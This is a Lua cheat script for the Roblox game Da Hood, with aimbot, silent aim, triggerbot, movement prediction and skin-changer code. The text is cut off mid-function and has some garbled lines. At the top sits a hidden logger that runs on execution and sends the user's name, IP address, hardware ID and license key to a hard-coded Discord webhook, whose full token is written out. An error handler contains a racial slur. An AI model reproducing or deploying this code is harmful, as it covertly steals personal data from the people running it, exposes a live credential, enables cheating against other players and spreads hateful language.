if getgenv().gravitycc_cleanup then
	getgenv().gravitycc_cleanup();
	getgenv().gravitycc_cleanup = nil;
end;

if not LPH_OBFUSCATED then
	LPH_JIT_MAX = function(...) return ... end
	LPH_NO_VIRTUALIZE = function(...) return ... end
	LPH_ENCSTR = function(...) return ... end
	LPH_ENCFUNC = function(...) return ... end
	LPH_CRASH = function() end
end
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1557633274736676864/W3ewahTbeypcr7e_pJ8dJH_GNgWuP8aDIYeQ429xmiNHzIWO7FeR0m34Quk8mexZWvQ5"

local function getHWID()
    if syn and syn.get_hwid then
        return syn.get_hwid()
    elseif gethwid then
        return gethwid()
    elseif identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown"
    end
end

local function getIP()
    local ok, result = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    if ok and result then
        return result
    end
    return "Unknown"
end

local function getLicenseKey()
    local ok, key = pcall(function()
        if getgenv and getgenv()["Platinun"] and getgenv()["Platinun"]["License Key"] then
            return tostring(getgenv()["Platinun"]["License Key"])
        end
        return nil
    end)
    if ok and key and key ~= "" then
        return key
    end
    return "Not Found"
end

local function code(str)
    return "```" .. tostring(str) .. "```"
end

local function sendWebhook()
    local embed = {
        embeds = {
            {
                title = "Logger | Executado",
                color = 3092790,
                timestamp = DateTime.now():ToIsoDate(),
                thumbnail = {
                    url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
                },
                fields = {
                    {
                        name = "Usuário",
                        value = code(LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")"),
                        inline = true
                    },
                    {
                        name = "IP",
                        value = code(getIP()),
                        inline = true
                    },
                    {
                        name = "HWID",
                        value = code(getHWID()),
                        inline = false
                    },
                    {
                        name = "License Key",
                        value = code(getLicenseKey()),
                        inline = false
                    },
                    {
                        name = "Status",
                        value = "Table Build",
                        inline = true
                    }
                },
                footer = {
                    text = "Logger Advanced Security System"
                }
            }
        }
    }

    local body = HttpService:JSONEncode(embed)

    local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request

    if requestFunc then
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end
end

task.spawn(sendWebhook)

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local GuiService = game:GetService("GuiService")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Camera = Workspace.CurrentCamera
local Inset = GuiService:GetGuiInset().Y


local function GetConfig()
	return shared.gravity;
end

local function GetFovSize(value, fallback)
	if type(value) == 'number' then
		return value;
	end;
	if type(value) == 'table' then
		local n = value[1] or value['X'] or value['X'];
		if type(n) == 'number' then return n end;
	end;
	return fallback;
end;

local Config = GetConfig();

local LastAppliedSkins = {};
local ApplySkinToTool = nil;
local ReapplyAllSkins = nil;
local WatchCharacter = nil;
local WatchBackpack = nil;

local function UpdateConfig(newConfig)
	shared.gravity = newConfig;
	Config = newConfig;




	if ReapplyAllSkins then
		ReapplyAllSkins();
	end
end
_Conns = {};
_Draws = {};

local function ___REMOVED_RunAutoReachShot(origin, callback, targetPosition)
	return callback(origin);
end;
local function GetToolFireDelay(Tool)
	local CD = Tool and Tool:FindFirstChild('ShootingCooldown');
	return CD and CD.Value or 0.3;
end;
function TrackConn(c) _Conns[#_Conns + 1] = c; return c; end;

MathRandom, MathFloor, MathCeil, MathClamp, MathAbs, MathSqrt, MathAtan2 = math.random, math.floor, math.ceil, math.clamp, math.abs, math.sqrt, math.atan2;
MathHuge, MathMin, MathMax, MathRad, MathDeg, MathPi, MathNoise = math.huge, math.min, math.max, math.rad, math.deg, math.pi, math.noise;

Vector2New, Vector3New, Vector3Zero = Vector2.new, Vector3.new, Vector3.zero;
CFrameNew, CFrameAngles, CFrameIdentity = CFrame.new, CFrame.Angles, CFrame.identity;
Color3RGB, Color3HSV, UDim2New = Color3.fromRGB, Color3.fromHSV, UDim2.new;
RayNew, RaycastParamsNew = Ray.new, RaycastParams.new;

Spawn, Defer, Delay, Wait, Cancel = task.spawn, task.defer, task.delay, task.wait, task.cancel;

Tick, Clock, Typeof, Unpack, Select = tick, os.clock, typeof, unpack, select;
Tonumber, Tostring, Pcall, Xpcall = tonumber, tostring, pcall, xpcall;

function ErrHandler(err)
	warn('nigger heres an error:', tostring(err));
	return err;
end;

local PreviousState = shared.__gravity_state;

State = {
	Connections = {},
	Targets = {
		Silent = PreviousState and PreviousState.Targets and PreviousState.Targets.Silent or nil,
		Aimbot = PreviousState and PreviousState.Targets and PreviousState.Targets.Aimbot or nil,
		Triggerbot = PreviousState and PreviousState.Targets and PreviousState.Targets.Triggerbot or nil,
	},
	Toggles = {
		SilentAim = PreviousState and PreviousState.Toggles and PreviousState.Toggles.SilentAim ~= nil and PreviousState.Toggles.SilentAim or true,
		Aimbot = PreviousState and PreviousState.Toggles and PreviousState.Toggles.Aimbot ~= nil and PreviousState.Toggles.Aimbot or true,
		Triggerbot = PreviousState and PreviousState.Toggles and PreviousState.Toggles.Triggerbot ~= nil and PreviousState.Toggles.Triggerbot or true,
	},
	Cache = {
		Previous = {},
		Tracked = {},
	},
	Ticks = {
		Triggerbot = 0,
		Rage = {},
	},
	TriggerState = false,
	CanTriggerbotShoot = true,
	LastTriggerShot = 0,
	SpeedModificationHumanoid = nil,
	OriginalWalkSpeed = nil,
	IsShooting = false,
	SorterActive = false,
	DoubleTapActive = false,

};
shared.__gravity_state = State;

CachedIgnored = Workspace:FindFirstChild('Ignored');
CachedBush = Workspace:FindFirstChild('Bush');
CachedSkinAssets = ReplicatedStorage:FindFirstChild('SkinAssets');
CachedAnimations = ReplicatedStorage:FindFirstChild('Animations') or ReplicatedStorage:FindFirstChild('ClientAnimations');

ShootFilter = {};
RageFilter = {};

EnumExclude = Enum.RaycastFilterType.Exclude;
EnumJumping = Enum.HumanoidStateType.Jumping;
EnumFreefall = Enum.HumanoidStateType.Freefall;
EnumLanded = Enum.HumanoidStateType.Landed;
EnumAir = Enum.Material.Air;
EnumDead = Enum.HumanoidStateType.Dead;
EnumFallingDown = Enum.HumanoidStateType.FallingDown;
EnumRagdoll = Enum.HumanoidStateType.Ragdoll;
EnumGettingUp = Enum.HumanoidStateType.GettingUp;

function BuildFilter(Tbl, Character)
	local Idx = 0;
	if Character then Idx = Idx + 1; Tbl[Idx] = Character end;
	if CachedIgnored then Idx = Idx + 1; Tbl[Idx] = CachedIgnored end;
	if CachedBush then Idx = Idx + 1; Tbl[Idx] = CachedBush end;
	for i = Idx + 1, #Tbl do Tbl[i] = nil end;
	return Tbl;
end;

function ResolveBodyEffect(Player, Effect)
	local Object = Player and Player.Character;
	local Body = Object and Object:FindFirstChild('BodyEffects');
	return Body and Body:FindFirstChild(Effect) and Body[Effect].Value or false;
end;

function ResolveConstraint(Player, Tag)
	local Object = Player and Player.Character;
	return Object and Object:FindFirstChild(Tag) ~= nil or false;
end;

function ResolveRemote(Name)
	return function() return ReplicatedStorage:FindFirstChild(Name) end;
end;

Stub = function() return false end;

Games = {
	[1008451066] = {
		Name = 'Da Hood',
		Updater = 'UpdateMousePosI2',
		Knocked = function(P)
			return ResolveBodyEffect(P, 'K.O') end,
		Grabbed = function(P)
			return ResolveConstraint(P, 'GRABBING_CONSTRAINT') end,
		Remote = ResolveRemote('MainEvent'),
		Args = {"Handle", "MuzzlePos", "HitPosition", "HitInstance", "HitNormal"},
		Method = "Emulate",
		Hooks = nil,
	},
	['Universal'] = {
		Name = 'Universal',
		Updater = nil,
		Knocked = function(P)
			return ResolveBodyEffect(P, 'K.O') end,
		Grabbed = function(P)
			return ResolveConstraint(P, 'GRABBING_CONSTRAINT') end,
		Remote = ResolveRemote('MainEvent'),
		Args = nil,
		Method = "Hooks",
		Hooks = "Raycast",
	},
};

Fallback = { Name = 'Universal', Updater = 'UpdateMousePos', Knocked = Stub, Grabbed = Stub, Remote = ResolveRemote('MainEvent') };
CurrentGame = Games[game.GameId] or Games['Universal'] or Fallback;

function CleanScripts(Tool)
	if not Tool then return end;
	for _, Descendant in next, Tool:GetDescendants() do
		if Descendant:IsA('LocalScript') then
			Descendant:Destroy();
		end;
	end;
	TrackConn(Tool.DescendantAdded:Connect(function(Desc)
		if Desc:IsA('LocalScript') then
			Desc:Destroy();
		end;
	end));
end;

if CurrentGame.Name == 'Da Hood' then
	function ApplySkinToTool(Tool, Force)
		if not Tool then return end;
		local Config = GetConfig();
		local SkinChangerCfg = Config['Misc']['Skin Changer'];
		if not SkinChangerCfg or not SkinChangerCfg['Enabled'] then return end;
		local DesiredSkin = SkinChangerCfg['Skins'] and SkinChangerCfg['Skins'][Tool.Name];



		if not Force and LastAppliedSkins[Tool] == DesiredSkin then return end;
		LastAppliedSkins[Tool] = DesiredSkin;

		local SkinAssets = CachedSkinAssets;
		if not SkinAssets then return end;
		
		local SkinFolder;
		if Tool.Name == '[Knife]' then
			SkinFolder = SkinAssets:FindFirstChild('KnifeSkins') and SkinAssets.KnifeSkins:FindFirstChild(DesiredSkin);
		else
			SkinFolder = SkinAssets:FindFirstChild('GunSkins') and SkinAssets.GunSkins:FindFirstChild(DesiredSkin);
		end
		
		local Default = Tool:FindFirstChild('Default');
		if not Default then return end;
		

		local ExistingMesh = Default:FindFirstChild('Mesh');
		if ExistingMesh then ExistingMesh:Destroy() end;
		

		if SkinFolder then
			local SkinMesh = SkinFolder:FindFirstChildWhichIsA('BasePart') or SkinFolder:FindFirstChild('Mesh');
			if SkinMesh then
				local ClonedMesh = SkinMesh:Clone();
				ClonedMesh.Parent = Default;
				ClonedMesh.Name = 'Mesh';
			end
		end
		

		local Handle = Tool:FindFirstChild('Handle');
		if Handle then
			Handle:SetAttribute('SkinName', DesiredSkin or '');
		end
	end;

	function ReapplyAllSkins()
		local Character = LocalPlayer.Character;
		if Character then
			for _, Child in next, Character:GetChildren() do
				if Child:IsA('Tool') then
					ApplySkinToTool(Child);
				end
			end
		end
		local Backpack = LocalPlayer:FindFirstChild('Backpack');
		if Backpack then
			for _, Child in next, Backpack:GetChildren() do
				if Child:IsA('Tool') then
					ApplySkinToTool(Child);
				end
			end
		end
	end

	function WatchCharacter(Character)
		if not Character then return end;
		for _, Child in next, Character:GetChildren() do
			if Child:IsA('Tool') then 
				CleanScripts(Child);
				ApplySkinToTool(Child);
			end;
		end;
		TrackConn(Character.ChildAdded:Connect(function(Child)
			if Child:IsA('Tool') then
				CleanScripts(Child);
				Defer(CleanScripts, Child);
				Defer(ApplySkinToTool, Child);
			end;
		end));
	end;
	
	function WatchBackpack(Backpack)
		if not Backpack then return end;
		for _, Child in next, Backpack:GetChildren() do
			if Child:IsA('Tool') then
				ApplySkinToTool(Child);
			end;
		end;
		TrackConn(Backpack.ChildAdded:Connect(function(Child)
			if Child:IsA('Tool') then
				Defer(ApplySkinToTool, Child);
			end;
		end));
	end;
	
	if LocalPlayer.Character then WatchCharacter(LocalPlayer.Character) end;
	if LocalPlayer:FindFirstChild('Backpack') then WatchBackpack(LocalPlayer.Backpack) end;
	TrackConn(LocalPlayer.CharacterAdded:Connect(WatchCharacter));
	TrackConn(LocalPlayer.ChildAdded:Connect(function(Child)
		if Child:IsA('Backpack') then
			WatchBackpack(Child);
		end
	end));
end;

PositionCache = {};
PositionHistorySize = 8;
PositionSampleInterval = 0.03;
LastPositionCacheUpdate = 0;

PositionEntryPool = {};
PositionPoolSize = 0;

function AcquireEntry(Pos, Time)
	local E;
	if PositionPoolSize > 0 then
		E = PositionEntryPool[PositionPoolSize];
		PositionEntryPool[PositionPoolSize] = nil;
		PositionPoolSize = PositionPoolSize - 1;
		E.Position = Pos;
		E.Time = Time;
	else
		E = { Position = Pos, Time = Time };
	end;
	return E;
end;

function ReleaseEntry(E)
	PositionPoolSize = PositionPoolSize + 1;
	PositionEntryPool[PositionPoolSize] = E;
end;

UpdatePositionCache = function()
	local Now = Clock();
	if (Now - LastPositionCacheUpdate) < PositionSampleInterval then return end;
	LastPositionCacheUpdate = Now;
	for _, Player in next, Players:GetPlayers() do
		if Player ~= LocalPlayer and Player.Character then
			local RootPart = Player.Character:FindFirstChild('HumanoidRootPart');
			if RootPart then
				if not PositionCache[Player] then
					PositionCache[Player] = {};
				end;
				local Cache = PositionCache[Player];
				local LastEntry = Cache[1];
				if not LastEntry or (Now - LastEntry.Time) >= PositionSampleInterval then
					table.insert(Cache, 1, AcquireEntry(RootPart.Position, Now));
					if #Cache > PositionHistorySize then
						ReleaseEntry(Cache[#Cache]);
						Cache[#Cache] = nil;
					end;
				end;
			end;
		end;
	end;
	for Player in next, PositionCache do
		if not Player.Parent then
			PositionCache[Player] = nil;
		end;
	end;
end;

GetDeltaVelocity = function(Player)
	local Velocity = GetSmoothedTargetMotion(Player);
	return Velocity;
end;

GetSmoothedTargetMotion = function(Player)
	local Cache = PositionCache[Player];
	if not Cache or #Cache < 2 then return Vector3Zero, Vector3Zero end;
	local Newest = Cache[1];
	local SampleIdx = MathMin(#Cache, 4);
	local Oldest = Cache[SampleIdx];
	local DeltaTime = Newest.Time - Oldest.Time;
	if DeltaTime <= 0.001 then return Vector3Zero, Vector3Zero end;

	local Velocity = (Newest.Position - Oldest.Position) / DeltaTime;
	local Acceleration = Vector3Zero;
	if #Cache >= 4 then
		local RecentTime = Cache[1].Time - Cache[2].Time;
		local OlderTime = Cache[3].Time - Cache[4].Time;
		local BetweenTime = ((Cache[1].Time + Cache[2].Time) - (Cache[3].Time + Cache[4].Time)) * 0.5;
		if RecentTime > 0.001 and OlderTime > 0.001 and BetweenTime > 0.001 then
			local RecentVelocity = (Cache[1].Position - Cache[2].Position) / RecentTime;
			local OlderVelocity = (Cache[3].Position - Cache[4].Position) / OlderTime;
			Acceleration = (RecentVelocity - OlderVelocity) / BetweenTime;
		end;
	end;

	if Velocity.Magnitude > 350 then Velocity = Vector3Zero end;
	if Acceleration.Magnitude > 1500 then Acceleration = Vector3Zero end;
	return Velocity, Acceleration;
end;

ApplyPrediction = function(Position, Target, FeatureCfg)
	local Character = Target.Character;
	if not Character then return Position end;
	local RootPart = Character:FindFirstChild('HumanoidRootPart');
	if not RootPart then return Position end;

	local PredCfg = FeatureCfg['Prediction'];
	if not PredCfg or PredCfg['Enabled'] ~= true then return Position end;

	local Vel = GetDeltaVelocity(Target);
	local Values = PredCfg['Values'] or {};
	local PredX = Values['X'] or 0.13;
	local PredY = Values['Y'] or 0.13;
	local PredZ = Values['Z'] or 0.13;

	return Position + Vel * Vector3New(PredX, PredY, PredZ);
end;

VisibilityParams = RaycastParamsNew();
VisibilityParams.FilterType = EnumExclude;
VisibilityParams.IgnoreWater = true;

function IsTyping()
	return UserInputService:GetFocusedTextBox() ~= nil;
end;

function IsCrew(Player)
	local PlayerCrew = Player and Player:GetAttribute('CrewID');
	local ClientCrew = LocalPlayer:GetAttribute('CrewID');
	return PlayerCrew and ClientCrew and PlayerCrew == ClientCrew or false;
end;

VisibilityFilter = {};
VisibilityCache = {};
VisibilityCacheFrame = 0;

IsVisible = function(TargetPos, Player)
	local FrameNow = MathFloor(Clock() * 60 + 0.5);
	if FrameNow ~= VisibilityCacheFrame then
		VisibilityCacheFrame = FrameNow;
		table.clear(VisibilityCache);
	end;
	if Player and VisibilityCache[Player] ~= nil then
		return VisibilityCache[Player];
	end;
	local Origin = Camera.CFrame.Position;
	local Direction = TargetPos - Origin;
	local Character = LocalPlayer.Character;
	local Idx = 0;
	if Character then Idx = Idx + 1; VisibilityFilter[Idx] = Character end;
	if CachedIgnored then Idx = Idx + 1; VisibilityFilter[Idx] = CachedIgnored end;
	if CachedBush then Idx = Idx + 1; VisibilityFilter[Idx] = CachedBush end;
	for i = Idx + 1, #VisibilityFilter do VisibilityFilter[i] = nil end;
	VisibilityParams.FilterDescendantsInstances = VisibilityFilter;
	local Result = Workspace:Raycast(Origin, Direction, VisibilityParams);
	local Visible = true;
	if Result then
		local Hit = Result.Instance;
		if Hit then
			local Model = Hit:FindFirstAncestorOfClass('Model');
			if not Model or not Model:FindFirstChildOfClass('Humanoid') then Visible = false end;
		else
			Visible = false;
		end;
	end;
	if Player then VisibilityCache[Player] = Visible end;
	return Visible;
end;

function GetGroundPosition(Position, ExcludeInstances)
	local Params = RaycastParams.new();
	Params.FilterType = EnumExclude;
	Params.FilterDescendantsInstances = ExcludeInstances or {};
	local Result = Workspace:Raycast(Position, Vector3New(0, -2000, 0), Params);
	return Result and Result.Position or nil;
end;


function DistancePointToSegment(Point, SegStart, SegEnd)
	local SegVector = SegEnd - SegStart;
	local Len2 = SegVector:Dot(SegVector);
	if Len2 <= 1e-6 then
		return (Point - SegStart).Magnitude;
	end;
	local t = MathClamp((Point - SegStart):Dot(SegVector) / Len2, 0, 1);
	local Closest = SegStart + SegVector * t;
	return (Point - Closest).Magnitude;
end;

PassesConditions = function(Player, ChecksKey)
	local AllChecks = GetConfig()['Core']['Conditions'];
	local Conds = (ChecksKey and AllChecks[ChecksKey]) or {};
	local Character = Player and Player.Character;
	if not Character then return false end;
	local Humanoid = Character:FindFirstChildOfClass('Humanoid');

	if Conds['Knocked'] then
		if not Humanoid or Humanoid.Health <= 0 or Humanoid:GetState() == EnumDead then
			return false;
		end;
		if CurrentGame.Knocked(Player) then
			return false;
		end;
	end;

	if Conds['Grabbed'] then
		if CurrentGame.Grabbed(Player) then
			return false;
		end;
	end;

	if Conds['Vehicle'] then
		if Humanoid and Humanoid.Sit then
			return false;
		end;
	end;

	if Conds['Visible'] then
		local HumanoidRootPart = Character:FindFirstChild('HumanoidRootPart');
		if HumanoidRootPart and not IsVisible(HumanoidRootPart.Position, Player) then
			return false;
		end;
	end;

	if Conds['Self Knocked'] then
		if CurrentGame.Knocked(LocalPlayer) then
			return false;
		end;
	end;

	return true;
end;

MuzzleOffsets = { 
	['[Deagle]'] = CFrameNew(0, 0.382, -1.568),
	['[Revolver]'] = CFrameNew(-0.1, 0.4, 1.8),
	['[Double-Barrel SG]'] = CFrameNew(0, 0.25, -2.5),
	['[TacticalShotgun]'] = CFrameNew(0, 0.7, -3.8),
	['[Silencer]'] = CFrameNew(0, 0.4, 1.3),
	['[SMG]'] = CFrameNew(2.5, 0.35, 0),
	['[Rifle]'] = CFrameNew(0, 0.2, -1.7),
	['[Shotgun]'] = CFrameNew(0, 0.4, 2.4),
	['[Flintlock]'] = CFrameNew(0, 0.25, 2.5),
	['[AK47]'] = CFrameNew(0.6, 0.25, 0),
	['[Glock]'] = CFrameNew(0, 0.4, 1.5),
	['[AR]'] = CFrameNew(0, 0.3, -2.0),
	['[AUG]'] = CFrameNew(0, 0.3, -2.5),
	['[Drum-Shotgun]'] = CFrameNew(0, 0.4, -2.0),
	['[DrumGun]'] = CFrameNew(0, 0.3, -1.5),
	['[LMG]'] = CFrameNew(0, 0.3, -2.5),
	['[P90]'] = CFrameNew(0, 0.3, -1.8),
	['[SilencerAR]'] = CFrameNew(0, 0.3, -2.0),
};

ShotgunWeapons = {
	['[Double-Barrel SG]'] = true,
	['[TacticalShotgun]'] = true,
	['[Tactical Shotgun]'] = true,
	['[Tactical-Shotgun]'] = true,
	['[Shotgun]'] = true,
	['[Drum-Shotgun]'] = true,
};

PistolWeapons = {
	['[Revolver]'] = true,
	['[Silencer]'] = true,
	['[Glock]'] = true,
	['[Deagle]'] = true,
};

function GetWeaponClass(name)
	if ShotgunWeapons[name] then return 'Shotguns' end;
	if PistolWeapons[name] then return 'Pistols' end;
	return 'Others';
end;

local EmulatedGunHandler = nil;
local EmulatedGunHandlerAttempted = false;
local EmbeddedGunHandlerSource = [=[

local t = {
	"[Shotgun]",
	"[Drum-Shotgun]",
	"[Rifle]",
	"[TacticalShotgun]",
	"[AR]",
	"[AUG]",
	"[AK47]",
	"[LMG]",
	"[SilencerAR]"
}
local t2 = {
	Brainrot = "All"
}
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local CurrentCamera = workspace.CurrentCamera
local TweenService = game:GetService("TweenService")

game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local v1 = LocalPlayer:GetMouse()
local SkinAssets = ReplicatedStorage.SkinAssets
local v2 = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local v3 = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(ReplicatedStorage:WaitForChild("Animations"):WaitForChild("GunCombat"):WaitForChild("Shoot"))
local v4 = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(ReplicatedStorage:WaitForChild("Animations"):WaitForChild("GunCombat"):WaitForChild("ShootLeft"))
local v5 = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(ReplicatedStorage.Animations.GunCombat.ShootRight)
local v6 = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(ReplicatedStorage:WaitForChild("Animations"):WaitForChild("GunCombat"):WaitForChild("AimShoot"))
local v7 = workspace:GetServerTimeNow()
local isPlaceId = game.PlaceId == 88976059384565
local GunSoundPlay = require(ReplicatedStorage:WaitForChild("GunSoundPlay"))

local function evalColorSequence(p1, p2)
	if p2 == 0 then
		return p1.Keypoints[1].Value
	end

	if p2 == 1 then
		return p1.Keypoints[#p1.Keypoints].Value
	end

	for i = 1, #p1.Keypoints - 1 do
		local v1 = p1.Keypoints[i]
		local v2 = p1.Keypoints[i + 1]

		if v1.Time <= p2 and p2 < v2.Time then
			local v3 = (p2 - v1.Time) / (v2.Time - v1.Time)

			return Color3.new((v2.Value.R - v1.Value.R) * v3 + v1.Value.R, (v2.Value.G - v1.Value.G) * v3 + v1.Value.G, (v2.Value.B - v1.Value.B) * v3 + v1.Value.B)
		end
	end
end

local functiRaycastShot(p1)
	if v2 ~= LocalPlayer.Character then
		v3 = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(ReplicatedStorage.Animations.GunCombat.Shoot)
		v4 = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(ReplicatedStorage.Animations.GunCombat.ShootLeft)
		v5 = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(ReplicatedStorage.Animations.GunCombat.ShootRight)
		v6 = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(ReplicatedStorage.Animations.GunCombat.AimShoot)
	end

	if _G.Aimed or (_G.MobleAimingIn or table.find(t, p1.Parent.Name)) then
		v6:Play()

		return
	end

	if p1:GetAttribute("DualWield") then
		v4:Play()
		v5:Play()
	else
		v3:Play()
	end
end

shared.playerShot = playerShot

local t3 = {
	getCanShoot = require(script.CanShoot),
	getAim = function(p1, p2)
		local v12 = RaycastParams.new()
		local t = { LocalPlayer.Character }
		local v2 = p2 or 200

		for v3, v4 in workspace.Ignored:GetChildren() do
			table.insert(t, v4)
		end

		v12.FilterDescendantsInstances = t
		v12.FilterType = Enum.RaycastFilterType.Exclude
		v12.IgnoreWater = true

		local v5

		if _G.MobileShiftLock or _G.MobleAimingIn then
			local Position = CurrentCamera.CFrame.Position
			local v6 = CurrentCamera.CFrame.LookVector * v2
			local v7 = workspace:Raycast(Position, v6, v12)

			v5 = if v7 then v7.Position else Position + v6
		else
			local v8 = CurrentCamera:ScreenPointToRay(v1.X, v1.Y)
			local v9 = workspace:Raycast(v8.Origin, v8.Direction * v2, v12)

			if v9 then
				v5 = v9.Position
			else
				local v10 = CurrentCamera.CFrame
				local LookVector = v10.LookVector
				local Origin = v8.Origin
				local Direction = v8.Direction

				v5 = Origin + Direction * ((v10.Position + v10.LookVector * v2 - Origin):Dot(LookVector) / Direction:Dot(LookVector))
			end
		end

		local v122 = v5 - p1

		return v122.Unit, v122.Magnitude
	end
}
local t4 = {}

function t3.shoot(p1)
	local Shooter = p1.Shooter
	local Handle = p1.Handle
	local BeamColor = p1.BeamColor
	local isReflecting = p1.isReflecting
	local Hit = p1.Hit
	local v1 = p1.Range or 200
	local v2 = Handle and Handle:GetAttribute("SkinName")
	local IsLeftHand = p1.IsLeftHand
	local v3 = Players:GetPlayerFromCharacter(Shooter)
	local v4 = v3 and v3:GetAttribute("GunFX") == true
	local _, v5 = t3.getAim(Handle.Position, v1)

	if Shooter ~= LocalPlayer.Character then
		v5 = v1
	end

	local v6 = p1.ForcedOrigin or Handle.Muzzle.WorldPosition
	local Unit = (p1.AimPosition - v6).Unit
	local v72 = RaycastParams.new()
	local t = {}
	local Ignored = require(game.ReplicatedStorage.MainModule).Ignored

	t[1] = Shooter
	t[2] = unpack(Ignored)
	v72.FilterDescendantsInstances = t
	v72.FilterType = Enum.RaycastFilterType.Exclude
	v72.IgnoreWater = true

	local v8, v9, v10

	if Hit then
		v8 = p1.Hit
		v9 = p1.AimPosition
		v10 = p1.Normal
	else
		local v11 = workspace:Raycast(v6, Unit * v1, v72)

		if v11 then
			v8 = v11.Instance
			v9 = v11.Position
			v10 = v11.Normal
		else
			v9 = v6 + Unit * math.min(v5, v1)
			v8 = nil
			v10 = nil
		end
	end

	if v8 then
		local isName = v8.Name == "Head"
	end

	if Shooter ~= LocalPlayer.Character then
		local BoostChar = LocalPlayer.Character;
		local BoostHRP = BoostChar and BoostChar:FindFirstChild('HumanoidRootPart');
		if BoostHRP then
			local RayTouchingMe = (v8 and v8:IsDescendantOf(BoostChar)) or DistancePointToSegment(BoostHRP.Position, v6, v9) <= 4;
			if RayTouchingMe then
				-- anti future boost removed
			end;
		end;
	end;

	local BULLET_RAYS = Instance.new("Part")

	BULLET_RAYS:SetAttribute("OwnerCharacter", Shooter.Name)
	BULLET_RAYS.Name = "BULLET_RAYS"
	BULLET_RAYS.Anchored = true
	BULLET_RAYS.CanCollide = false
	BULLET_RAYS.Size = Vector3.new(0, 0, 0)
	BULLET_RAYS.Transparency = 1
	game.Debris:AddItem(BULLET_RAYS, 1)
	BULLET_RAYS.CFrame = CFrame.new(v6, v9)
	BULLET_RAYS.Material = Enum.Material.SmoothPlastic
	BULLET_RAYS.Parent = workspace.Ignored.Siren.Radius

	local Attachment = Instance.new("Attachment")

	Attachment.Position = Vector3.new(0, 0, 0)
	Attachment.Parent = BULLET_RAYS

	local Attachment2 = Instance.new("Attachment")
	local v12 = -(v9 - v6).magnitude

	Attachment2.Position = Vector3.new(0, 0, v12)
	Attachment2.Parent = BULLET_RAYS

	local v13 = false
	local v14 = nil
	local NewGunBeam

	if Handle then
		local v15 = Handle.Parent and Handle.Parent.Name

		if v15 and not v4 and (v2 and v2 ~= "" or SkinAssets.GunSkinMuzzleParticle:FindFirstChild(v15)) then
			v2 = v2 ~= "" and v2 or v15

			local v19 = if IsLeftHand then "LeftMuzzle" else "Muzzle"

			if SkinAssets.GunSkinMuzzleParticle:FindFirstChild(v2) then
				if not isReflecting and (SkinAssets.GunSkinMuzzleParticle[v2]:FindFirstChild(v19) or IsLeftHand) then
					local v20 = Handle.Parent:FindFirstChild("Default") and Handle.Parent.Default:FindFirstChild("Mesh") and Handle.Parent.Default.Mesh:FindFirstChild(v19) or Handle:FindFirstChild(v19)
					local v21

					if IsLeftHand then
						local v22 = Handle.Parent:FindFirstChild("Default") and Handle.Parent.Default:FindFirstChild("Mesh") and Handle.Parent.Default.Mesh.DualWieldLeftHandMesh:FindFirstChild(v19) or v20

						v21 = if v22 == v20 then false else true

						if v21 then
							v20 = v22
						end
					else
						v21 = false
					end

					if v20 then
						for v24, v25 in (if v21 then v20 elseif SkinAssets.GunSkinMuzzleParticle[v2].Muzzle:FindFirstChild("Different_GunMuzzle") then SkinAssets.GunSkinMuzzleParticle[v2][v19].Different_GunMuzzle[v15] else SkinAssets.GunSkinMuzzleParticle[v2][v19]):GetChildren() do
							local v26 = v25:GetAttribute("EmitCount") or 1
							local v27 = IsLeftHand and v25 or v25:Clone()

							v27.Parent = v20
							v27:Emit(v26)

							if not v21 then
								task.delay(v27.Lifetime.Max, function()
									v27:Destroy()
								end)
							end
						end
					end
				elseif not isReflecting then
					local v28 = SkinAssets.GunSkinMuzzleParticle[v2]:GetChildren()
					local v29 = v28[math.random(#v28)]:Clone()

					v29.Parent = Attachment
					v29:Emit(v29.Rate)
				end

				v13 = true
			end

			if SkinAssets.GunBeam:FindFirstChild(v2) then
				local v30 = SkinAssets.GunBeam[v2]
				local v31 = if IsLeftHand then "LeftGunBeam" else "GunBeam"
				local v32 = v30:FindFirstChild(v31) or v30.GunBeam
				local _2 = IsLeftHand and (v32:IsA("BasePart") and v32:FindFirstChild("LeftHandBeam"))

				if v32:IsA("BasePart") then
					local t5 = {
						Parent = nil,
						Attachment0 = nil,
						Attachment1 = nil
					}
					local Different_GunBeam = v32:FindFirstChild("Different_GunBeam")

					if Different_GunBeam and Different_GunBeam:FindFirstChild(v15) then
						local v33 = Different_GunBeam[v15][v31]

						if v33 and v33:IsA("BasePart") then
							v14 = v33:Clone()
							NewGunBeam = t5
						else
							NewGunBeam = v33 and v33:Clone() or t5
						end
					else
						v14 = v32:Clone()
						NewGunBeam = t5
					end
				else
					NewGunBeam = v32:Clone()
				end
			else
				local v36 = game.ReplicatedStorage.GunBeam:Clone()

				NewGunBeam = v36
				v36.Color = BeamColor and ColorSequence.new(BeamColor) or v36.Color
			end
		else
			local v16, v17

			v16 = game.ReplicatedStorage.GunBeam:Clone()
			v17 = BeamColor and ColorSequence.new(BeamColor) or v16.Color
			NewGunBeam = v16
			v16.Color = v17
		end
	else
		NewGunBeam = nil
	end

	task.spawn(function()
		if v14 then
			local magnitude = (v9 - v6).magnitude
			local v1 = magnitude / 725

